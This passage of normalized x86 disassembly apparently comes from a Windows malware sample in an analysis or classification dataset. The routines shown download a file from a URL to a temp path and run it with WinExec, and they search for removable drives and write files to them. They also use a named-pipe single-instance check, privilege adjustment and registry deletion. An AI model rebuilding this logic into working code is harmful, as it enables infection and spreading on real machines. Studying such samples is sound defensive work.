movzx edx [ ebp - 0x12 ]
add eax ecx
movzx ecx [ ebp - 0x14 ]
imul ecx ecx 0x64
add ecx edx
sub eax ecx
push eax
mov [ ebp + 0x60 ] ebx
call sub_410778
cmp eax 0x5a0
pop ecx
jge r-xdata
cmp [ ebp + 0x5c ] ebx
jne r-xdata
cmp [ ebp + 0x54 ] 0x4
je r-xdata
mov [ ebp + 0x60 ] 0xf0
call sub_40b02e
test al al
je r-xdata
mov [ ebp + 0x60 ] 0x1
push 0xea60
call [ Sleep@IAT ]
call sub_40b02e
test al al
jne r-xdata
cmp [ ebp + 0x60 ] 0xf0
jl r-xdata
cmp [ ebp + 0x4c ] 0x3
jle r-xdata
mov [ ebp + 0x5c ] 0x1
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x48 ]
push edx
push eax
call [ ecx + 0xb0 ]
push ebx
push ebx
push 0x400
lea eax [ ebp - 0xc3c ]
push eax
push 0xffffffff
push [ ebp + 0x48 ]
push ebx
push ebx
call edi
push [ rw-data ]
lea eax [ ebp - 0xc3c ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x54 ]
push edx
push eax
call [ ecx + 0xe0 ]
push 0x1f4
call [ Sleep@IAT ]
inc [ ebp + 0x60 ]
call sub_40b02e
test al al
je r-xdata
jmp r-xdata
cmp [ ebp + 0x5c ] ebx
jne r-xdata
mov [ ebp + 0x60 ] ebx
push [ ebp + 0x48 ]
call [ SysFreeString@IAT ]
cmp [ ebp + 0x5c ] ebx
jne r-xdata
mov [ ebp + 0x5c ] 0x1
cmp [ ebp + 0x60 ] ebx
jne r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x2c ]
push edx
push eax
call [ ecx + 0x48 ]
mov eax [ ebp + 0x2c ]
lea edx [ ebp + 0x50 ]
push edx
push r--data
mov [ ebp + 0x50 ] ebx
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
push ebx
push ebx
push 0x400
lea eax [ ebp - 0xc3c ]
push eax
push 0xffffffff
push [ ebp + 0x58 ]
push ebx
push ebx
call edi
push 0x1
call esi
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp + 0x4 ]
push edx
lea edx [ ebp - 0x2c ]
push edx
push edx
push [ ebp + 0x58 ]
push eax
call [ ecx + 0x2c ]
push 0x2
mov [ ebp + 0x54 ] eax
call esi
inc [ ebp + 0x4c ]
cmp [ ebp + 0x54 ] ebx
jl r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp + 0x50 ]
mov ecx [ eax ]
lea edx [ ebp + 0x44 ]
push edx
push eax
call [ ecx + 0x44 ]
push ebx
push ebx
push 0x400
lea eax [ ebp - 0x43c ]
push eax
push 0xffffffff
push [ ebp + 0x44 ]
push ebx
push ebx
call edi
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x44 ]
call [ SysFreeString@IAT ]
mov eax [ ebp + 0x50 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp + 0x5c ] 0x1
sub_40df39
push ebp
mov ebp esp
sub esp 0x64
push esi
push edi
push 0x63
lea eax [ ebp - 0x63 ]
push 0x0
push eax
mov [ ebp - 0x64 ] 0x0
call sub_41112d
mov eax [ ebp + 0x8 ]
add esp 0xc
xor ecx ecx
test eax eax
jbe r-xdata
xor ecx ecx
mov [ ebp - 0x64 ] 0x30
inc ecx
xor edx edx
push 0xa
pop esi
div esi
add dl 0x30
mov [ ebp + ecx - 0x64 ] dl
inc ecx
test eax eax
ja r-xdata
mov [ ecx + edi ] 0x0
pop edi
pop esi
leave
retn
lea esi [ ebp + ecx - 0x65 ]
test ecx ecx
jne r-xdata
mov dl [ esi ]
mov [ eax + edi ] dl
inc eax
dec esi
cmp eax ecx
jl r-xdata
mov edi [ ebp + 0xc ]
xor eax eax
test ecx ecx
jle r-xdata
sub_40df9c
push ebp
mov ebp esp
mov eax 0x2a0c
call sub_40f8bc
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0x1 ] bl
jne r-xdata
push edi
lea eax [ ebp - 0x20c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
push 0x1
push ebx
lea eax [ ebp - 0x20c ]
push eax
call [ GetTempFileNameA@IAT ]
push r--data
lea eax [ ebp - 0x108 ]
push eax
call [ lstrcatA@IAT ]
mov edi [ CreateFileA@IAT ]
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x108 ]
push eax
call edi
cmp eax ebx
jne r-xdata
xor al al
jmp r-xdata
push esi
mov esi [ CloseHandle@IAT ]
push eax
call esi
push ebx
push ebx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
push ebx
call URLDownloadToFileA
test eax eax
jne r-xdata
xor al al
jmp r-xdata
pop ebx
leave
retn
mov al [ ebp - 0x1 ]
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
lea eax [ ebp - 0x108 ]
push eax
call edi
mov edi eax
cmp edi ebx
je r-xdata
pop edi
xor al al
jmp r-xdata
push 0x27ff
lea eax [ ebp - 0x2a0b ]
push ebx
push eax
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x2a0c ] bl
call sub_41112d
add esp 0xc
push ebx
lea eax [ ebp + 0x8 ]
push eax
push 0x2800
lea eax [ ebp - 0x2a0c ]
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
pop esi
push edi
call esi
push r--data
xor edi edi
xor esi esi
call [ lstrlenA@IAT ]
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
cmp edi eax
jne r-xdata
mov dl [ ebp + ecx - 0x2a0c ]
cmp dl [ esi + r--data ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
cmp edi eax
je r-xdata
inc edi
inc esi
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
xor edi edi
xor esi esi
inc ecx
cmp ecx [ ebp + 0x8 ]
jb r-xdata
jmp r-xdata
sub_40e10c
push ebp
lea ebp [ esp - 0x6c ]
mov eax 0x279c
call sub_40f8bc
push ebx
mov ebx [ ebp + 0x74 ]
push esi
xor esi esi
cmp ebx esi
push edi
jne r-xdata
cmp [ ebx + 0x8 ] esi
je r-xdata
xor al al
jmp r-xdata
push 0x270f
lea eax [ ebp - 0x272f ]
push esi
push eax
mov [ ebp + 0x68 ] esi
mov [ ebp - 0x2730 ] 0x0
call sub_41112d
xor eax eax
inc [ rw-data ]
mov [ ebp + 0x54 ] 0x0
lea edi [ ebp + 0x55 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
push 0x63
stosb [ edi ]
lea eax [ ebp - 0x1f ]
push esi
push eax
mov [ ebp - 0x20 ] 0x0
call sub_41112d
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call sub_4116d8
lea eax [ ebp + 0x54 ]
push eax
push [ rw-data ]
call sub_40df39
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_411657
add esp 0x30
cmp [ ebp + 0x78 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
add ebp 0x6c
leave
retn
mov eax [ ebx + 0x8 ]
cmp eax esi
jle r-xdata
push 0xd
call sub_411160
cmp eax esi
pop ecx
je r-xdata
cmp [ ebp + 0x78 ] 0x0
jne r-xdata
mov esi [ lstrcatA@IAT ]
xor ebx ebx
mov ecx eax
call sub_40f5f9
mov ebx eax
jmp r-xdata
mov al 0x1
mov ecx ebx
call sub_40f609
push ebx
call sub_410a7a
pop ecx
mov edi [ ebx + 0x4 ]
add edi [ ebp + 0x68 ]
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call [ lstrcpyA@IAT ]
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2730 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
lea eax [ ebp + 0x54 ]
push eax
push [ ebp + 0x68 ]
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp - 0x2730 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
mov eax [ ebp + 0x74 ]
inc eax
push eax
push edi
lea eax [ ebp - 0x2730 ]
push eax
call [ lstrlenA@IAT ]
lea eax [ ebp + eax - 0x2730 ]
push eax
call [ lstrcpynA@IAT ]
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
lea eax [ ebp + 0x54 ]
push eax
push [ ebp + 0x74 ]
push edi
call sub_40ae78
pop ecx
pop ecx
push eax
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp - 0x2730 ]
push eax
call esi
add [ ebp + 0x68 ] 0x3e8
mov eax [ ebp + 0x68 ]
add eax 0x3e8
cmp eax [ ebx + 0x8 ]
jl r-xdata
mov [ ebp + 0x74 ] ecx
sub esp 0x10
mov edi esp
sub esp 0x10
mov ecx esp
push [ ebp + 0x74 ]
call sub_40f594
push edi
call sub_40a77b
add esp 0x14
lea eax [ ebp + 0x47 ]
push eax
mov ecx ebx
call sub_40f80b
lea ecx [ ebp + 0x47 ]
call sub_40f609
lea eax [ ebp - 0x2730 ]
push eax
xor edi edi
call sub_40df9c
test al al
pop ecx
jne r-xdata
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
lea eax [ ebp + 0x54 ]
push eax
push [ ebp + 0x7c ]
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp - 0x2730 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x2730 ]
push eax
call esi
mov edi [ ebx + 0x4 ]
lea eax [ ebp + 0x54 ]
push eax
push edi
call sub_411738
push eax
push edi
call sub_40ae78
add esp 0xc
push eax
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp - 0x2730 ]
push eax
call esi
mov eax [ ebx + 0x8 ]
cmp [ ebp + 0x68 ] eax
jl r-xdata
cmp edi 0xa
jge r-xdata
sub eax [ ebp + 0x68 ]
mov ecx 0x3e8
cmp eax ecx
mov [ ebp + 0x74 ] eax
jl r-xdata
lea eax [ ebp - 0x2730 ]
push eax
call sub_40df9c
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x2730 ]
push eax
inc edi
call sub_40df9c
test al al
pop ecx
je r-xdata
cmp [ ebp + 0x78 ] 0x0
jne r-xdata
cmp edi 0xa
jl r-xdata
mov ecx ebx
call sub_40f609
push ebx
call sub_410a7a
pop ecx
jmp r-xdata
sub_40e3ce
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
push r--data
mov ebx 0x80000001
lea eax [ ebp - 0x34 ]
push ebx
push eax
call sub_40c1b3
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
movsd [ edi ] [ esi ]
call [ GetSystemTime@IAT ]
movzx eax [ ebp - 0x12 ]
movzx ecx [ ebp - 0xe ]
imul eax eax 0x1e
add eax ecx
movzx ecx [ ebp - 0xc ]
imul eax eax 0x18
add eax ecx
movzx ecx [ ebp - 0xa ]
imul eax eax 0x3c
movzx edx [ ebp - 0x1e ]
add eax ecx
movzx ecx [ ebp - 0x22 ]
imul ecx ecx 0x1e
add ecx edx
movzx edx [ ebp - 0x1c ]
imul ecx ecx 0x18
add ecx edx
imul ecx ecx 0x3c
sub ecx eax
movzx eax [ ebp - 0x1a ]
add ecx eax
push ecx
call sub_410778
cmp eax 0x5a0
pop ecx
jge r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov esi r--data
push esi
push ebx
call [ RegOpenKeyA@IAT ]
test eax eax
mov edi r--data
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x1
push r--data
push edi
push esi
push ebx
call sub_40c0bc
add esp 0x14
neg eax
sbb eax eax
inc eax
push edi
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_40e49d
push ebp
mov ebp esp
sub esp 0x404
push ebx
push esi
push edi
call [ GetLogicalDrives@IAT ]
and [ ebp - 0x8 ] 0x0
mov ebx [ CreateFileA@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x3 ] 0x41
mov esi 0x1f3
sar [ ebp - 0xc ] 0x1
inc [ ebp - 0x3 ]
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1a
jl r-xdata
xor eax eax
mov [ ebp - 0x1c ] 0x5c3a43
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosw [ edi ]
mov al [ ebp - 0x3 ]
mov [ ebp - 0x1c ] al
lea eax [ ebp - 0x1c ]
push eax
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
jne r-xdata
test [ ebp - 0xc ] 0x1
je r-xdata
jmp r-xdata
push esi
xor edi edi
lea eax [ ebp - 0x20f ]
push edi
push eax
mov [ ebp - 0x210 ] 0x0
call sub_41112d
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x210 ]
push r--data
push eax
call sub_411657
add esp 0x1c
push edi
push 0x80
push 0x3
push edi
push 0x1
push 0x80000000
lea eax [ ebp - 0x210 ]
push eax
call ebx
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push esi
xor edi edi
lea eax [ ebp - 0x403 ]
push edi
push eax
mov [ ebp - 0x404 ] 0x0
call sub_41112d
add esp 0xc
mov [ ebp - 0x8 ] edi
push edi
push 0x80
push 0x3
push edi
push 0x1
push 0x80000000
lea eax [ ebp - 0x404 ]
push eax
call ebx
cmp eax 0xffffffff
jne r-xdata
xor eax eax
lea edi [ ebp - 0x3 ]
stosb [ edi ]
mov eax esi
cdq
push 0x19
pop ecx
idiv ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x404 ]
add dl 0x61
push eax
mov [ ebp - 0x4 ] dl
call sub_411657
test esi esi
pop ecx
pop ecx
jg r-xdata
push eax
call [ CloseHandle@IAT ]
sub esp 0x10
lea eax [ ebp - 0x404 ]
mov ecx esp
push eax
mov [ ebp - 0xc ] edi
call sub_40f4c7
mov ecx [ ebp + 0x8 ]
call sub_40ee00
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_4116d8
mov esi [ ebp - 0x8 ]
cmp esi edi
pop ecx
pop ecx
mov [ ebp - 0xc ] 0x1
jle r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
inc [ ebp - 0x8 ]
cmp [ ebp - 0xc ] edi
jne r-xdata
sub_40e634
push esi
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x64
push 0x64
push 0x64
push 0x1
push 0x4
push 0x80003
push r--data
call [ CreateNamedPipeA@IAT ]
call [ GetLastError@IAT ]
mov esi eax
call sub_40bdbc
test esi esi
pop esi
je r-xdata
retn
push 0x0
call [ ExitProcess@IAT ]
sub_40e674
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
call sub_40bb9f
pop edi
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0x10 ]
push eax
push r--data
push edi
call [ LookupPrivilegeValueA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
push edi
push edi
push edi
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov esi eax
cmp esi edi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
neg esi
sbb esi esi
inc esi
sub_40e6f3
mov eax [ esp + 0x4 ]
xor edx edx
lea ecx [ eax + 0xcff6 ]
inc edx
push esi
inc eax
cmp eax ecx
jg r-xdata
xor edx edx
xor eax eax
pop esi
retn
test edx edx
jne r-xdata
mov esi [ eax ]
and esi 0xffffff
cmp esi 0x68386a
jne r-xdata
dec eax
pop esi
retn
sub_40e723
sub esp 0x10
mov eax [ esp + 0x14 ]
movzx ecx [ eax + 0x2 ]
push ebx
movzx ebx [ eax ]
push ebp
push esi
movzx esi [ eax + 0xa ]
add esi ecx
push edi
movzx edi [ eax + 0x8 ]
movzx eax [ eax + 0x6 ]
add edi eax
mov eax edi
imul eax esi
imul eax ebx
cdq
mov ebp 0xff
mov ecx ebp
idiv ecx
mov ecx esi
push 0x37
mov eax edx
mov edx ebx
shl edx cl
mov ecx ebp
add eax edx
sub eax edi
imul eax esi
cdq
idiv ecx
mov eax esi
imul eax ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] edx
cdq
idiv edi
mov eax [ esp + 0x28 ]
imul eax edi
add eax esi
add eax ebx
mov [ esp + 0x14 ] edx
cdq
idiv ecx
mov eax edx
add eax [ esp + 0x14 ]
add eax edi
cdq
idiv ecx
lea eax [ esi + ebx + 0x1 ]
imul eax edi
add eax [ esp + 0x18 ]
pop ecx
add eax esi
add eax ebx
mov [ esp + 0x1c ] edx
cdq
idiv ecx
mov ecx edi
mov eax edx
mov edx edi
shl edx cl
mov ecx esi
add eax edx
mov edx edi
shl edx cl
mov ecx ebp
add eax edx
imul eax eax 0x11
cdq
idiv ecx
mov eax edi
imul eax ebx
mov [ esp + 0x18 ] edx
cdq
idiv esi
mov eax esi
mov ecx edx
cdq
idiv edi
mov edi edx
add edi [ esp + 0x10 ]
mov eax ebx
cdq
idiv esi
add edi ecx
mov eax edx
add eax edi
add eax [ esp + 0x14 ]
pop edi
add eax [ esp + 0x14 ]
pop esi
add eax [ esp + 0x14 ]
add eax [ esp + 0x1c ]
cdq
idiv ebp
pop ebp
pop ebx
mov eax edx
shl eax 0x8
add eax [ esp + 0x8 ]
shl eax 0x8
add eax [ esp + 0xc ]
shl eax 0x8
add eax [ esp + 0x14 ]
add esp 0x10
retn
sub_40e821
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
push esi
push eax
call sub_4108df
mov [ esp ] r--data
push [ rw-data ]
mov esi eax
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
inc eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40e723
pop ecx
xor ecx ecx
cmp esi eax
sete cl
mov eax ecx
xor eax eax
inc eax
jmp r-xdata
pop esi
leave
retn
sub_40e879
push ebp
mov ebp esp
mov eax 0x3020
call sub_40f8bc
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push esi
mov esi 0x12b
push esi
lea eax [ ebp - 0x47f ]
push ebx
push eax
mov [ ebp - 0x480 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x480 ]
push eax
push 0x12c
call [ GetTempPathA@IAT ]
push esi
lea eax [ ebp - 0x15f ]
push ebx
push eax
mov [ ebp - 0x160 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x160 ]
push eax
push 0x1
push ebx
lea eax [ ebp - 0x480 ]
push eax
call [ GetTempFileNameA@IAT ]
lea eax [ ebp - 0x160 ]
push r--data
push eax
call sub_411657
pop ecx
pop ecx
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x160 ]
push eax
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push r--data
push r--data
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call sub_4115f3
mov ax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x1e ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x1a ] ax
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebp - 0x16 ] ax
add esp 0x1c
lea eax [ ebp - 0x34 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_402443
test al al
pop ecx
pop ecx
jne r-xdata
pop esi
push edi
push 0x2a
pop ecx
mov esi r--data
lea edi [ ebp - 0x528 ]
[ edi ] [ esi ]
xor esi esi
xor eax eax
pop ebx
leave
retn
push ebx
lea eax [ ebp - 0x24 ]
push eax
push 0x1
lea eax [ ebp + esi - 0x528 ]
push eax
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
inc esi
cmp esi 0xa8
jl r-xdata
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov esi 0x1f3
push esi
lea eax [ ebp - 0x353 ]
push ebx
push eax
mov [ ebp - 0x354 ] bl
call sub_41112d
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x354 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x354 ]
push r--data
push eax
call sub_411657
push esi
lea eax [ ebp - 0x71b ]
push ebx
push eax
mov [ ebp - 0x71c ] bl
call sub_41112d
push esi
lea eax [ ebp - 0x90f ]
push ebx
push eax
mov [ ebp - 0x910 ] bl
call sub_41112d
add esp 0x34
inc esi
push esi
lea eax [ ebp - 0x71c ]
push eax
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
push esi
lea eax [ ebp - 0x910 ]
push eax
lea eax [ ebp - 0x71c ]
push eax
call [ GetShortPathNameA@IAT ]
mov edi r--data
lea eax [ ebp - 0x354 ]
push edi
push eax
call sub_411657
lea eax [ ebp - 0x910 ]
push eax
lea eax [ ebp - 0x354 ]
push eax
call sub_411657
lea eax [ ebp - 0x354 ]
push edi
push eax
call sub_411657
push 0x270f
lea eax [ ebp - 0x301f ]
push ebx
push eax
mov [ ebp - 0x3020 ] bl
call sub_41112d
add esp 0x24
push 0x2710
lea eax [ ebp - 0x3020 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov esi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x3020 ]
push eax
call esi
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x3020 ]
push eax
call esi
push edi
lea eax [ ebp - 0x3020 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x3020 ]
push eax
call [ WinExec@IAT ]
pop edi
sub_40eb16
push ebp
mov ebp esp
sub esp 0x18
push 0x0
call [ SetErrorMode@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
movzx ecx [ ebp - 0xe ]
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0xa ]
imul ecx edx
imul ecx eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov [ fs : 0x0 ] 0x0
mov eax [ ebp - 0x8 ]
call eax
mov eax [ ebp - 0x4 ]
call eax
xor eax eax
leave
retn
sub_40eb9e
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
push esi
lea esi [ ebx + 0x8 ]
push edi
mov ecx esi
call sub_40f5f9
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
call sub_40f80b
lea ecx [ ebp - 0xd ]
call sub_40f609
cmp [ ebp + 0x10 ] 0x4
mov [ ebx ] edi
je r-xdata
mov [ rw-data ] 0x1
mov esi rw-data
push edi
push [ ebp + 0xc ]
push r--data
push edi
call [ MessageBoxA@IAT ]
push edi
call [ ExitProcess@IAT ]
push edi
lea ecx [ ebp + 0x8 ]
call sub_40f627
movzx eax [ eax ]
push eax
mov ecx esi
call sub_40f645
inc edi
cmp edi 0x4
jl r-xdata
mov edi [ ebp + 0x18 ]
push edi
mov ecx esi
call sub_40f645
mov eax edi
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
mov eax edi
sar eax 0x10
push eax
mov ecx esi
call sub_40f645
sar edi 0x18
push edi
mov ecx esi
call sub_40f645
mov eax [ rw-data ]
push 0x4
mov [ ebx + 0x4 ] eax
pop edi
push 0x37
mov ecx esi
call sub_40f645
dec edi
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40f609
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x14
sub_40ec7e
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov [ ebp - 0x4 ] ecx
push edi
lea ecx [ ebp - 0x14 ]
call sub_40f5f9
mov esi [ ebp + 0x1c ]
push r--data
lea ecx [ ebp - 0x21 ]
mov [ ebp + 0x1c ] esi
call sub_40f45c
push eax
lea ecx [ ebp + 0x8 ]
call sub_40f7cb
lea ecx [ ebp - 0x21 ]
mov bl al
call sub_40f609
test bl bl
je r-xdata
mov edi [ ebp + 0x18 ]
sub esp 0x10
mov eax esp
push [ ebp + 0x18 ]
push esi
push eax
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x21 ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_40f80b
lea ecx [ ebp - 0x21 ]
call sub_40f609
mov eax [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov [ ebp + 0x1c ] eax
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call sub_40f609
lea ecx [ ebp + 0x8 ]
call sub_40f609
pop edi
pop esi
pop ebx
leave
retn 0x18
cmp [ ebp + 0x10 ] 0x4
je r-xdata
xor ebx ebx
cmp edi ebx
jl r-xdata
mov esi rw-data
push ebx
call [ ExitProcess@IAT ]
push ebx
lea ecx [ ebp + 0x8 ]
call sub_40f627
movzx eax [ eax ]
push eax
mov ecx esi
call sub_40f645
inc ebx
cmp ebx [ ebp + 0x10 ]
jl r-xdata
push edi
mov ecx esi
call sub_40f645
mov eax edi
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
mov eax edi
sar eax 0x10
push eax
mov ecx esi
call sub_40f645
mov eax edi
sar eax 0x18
push eax
mov ecx esi
call sub_40f645
xor ebx ebx
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
add edi 0x8
add [ eax ] edi
mov eax [ ebp + 0x1c ]
movzx eax [ ebx + eax ]
push eax
mov ecx esi
call sub_40f645
inc ebx
cmp ebx edi
jl r-xdata
sub_40ed8a
cmp [ rw-data ] 0x1
push esi
mov esi ecx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
jge r-xdata
and [ rw-data ] 0x0
lea ecx [ esi + 0x8 ]
pop esi
jmp sub_40f609
push ebx
push edi
mov edi rw-data
push eax
mov ecx edi
call sub_40f627
mov cl [ esi ]
mov [ eax ] cl
mov ebx [ esi ]
mov eax [ esi + 0x4 ]
sar ebx 0x8
inc eax
push eax
mov ecx edi
call sub_40f627
mov [ eax ] bl
mov eax [ esi + 0x4 ]
movsx ebx [ esi + 0x2 ]
inc eax
inc eax
push eax
mov ecx edi
call sub_40f627
mov [ eax ] bl
mov eax [ esi + 0x4 ]
movsx ebx [ esi + 0x3 ]
add eax 0x3
push eax
mov ecx edi
call sub_40f627
pop edi
mov [ eax ] bl
pop ebx
sub_40ee00
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
mov edi ecx
lea ecx [ ebp - 0x18 ]
call sub_40f5f9
xor ebx ebx
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push esi
mov esi [ edi + 0xc ]
test esi esi
jle r-xdata
xor bl bl
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov bl 0x1
pop esi
jmp r-xdata
add edi 0x4
lea ecx [ ebp - 0x18 ]
call sub_40f609
lea ecx [ ebp + 0x8 ]
call sub_40f609
pop edi
mov al bl
pop ebx
leave
retn 0x10
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
mov ecx edi
call sub_40f627
push eax
push [ ebp - 0x4 ]
call [ WriteFile@IAT ]
inc ebx
cmp ebx esi
jl r-xdata
sub_40ee85
push ebp
mov ebp esp
sub esp 0x24
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ GetCurrentProcess@IAT ]
push 0x20
call edi
mov ebx [ SetPriorityClass@IAT ]
push eax
call ebx
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push eax
call sub_411051
xor edi edi
cmp [ esi + 0xc ] edi
pop ecx
mov ebx eax
jle r-xdata
push 0x40
call edi
push eax
